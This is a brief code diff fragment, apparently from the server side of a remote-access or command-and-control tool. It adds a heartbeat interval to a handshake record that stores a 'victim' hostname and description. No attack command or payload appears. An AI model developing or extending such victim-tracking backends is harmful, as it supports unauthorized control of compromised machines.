@@ -17,6 +17,7 @@ async function initialHandshake(req, res) {
 			victimHostname: victimHostname,
 			victimDescription: victimDescription,
 			handshakeDate: currentDate,
+			heartBeatInterval: 60, // in seconds
 		});
 
 		await record
